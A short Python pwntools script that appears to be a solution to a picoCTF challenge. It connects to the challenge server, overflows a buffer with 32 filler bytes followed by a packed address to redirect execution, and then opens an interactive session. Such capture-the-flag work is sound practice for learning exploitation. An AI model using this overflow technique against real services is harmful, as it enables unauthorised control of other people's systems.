#!/usr/bin/env python3
from pwn import *

io = remote("mimas.picoctf.net", 61137)
io.recvuntil(b'Enter your choice: ')
io.sendline(b'2')
io.recvuntil(b'Data for buffer: ')
code = flat([
	b'A'*32,
	p64(0x4011a0)
	])
io.sendline(code)
io.recvuntil(b'Enter your choice: ')
io.sendline(b'4')


io.interactive()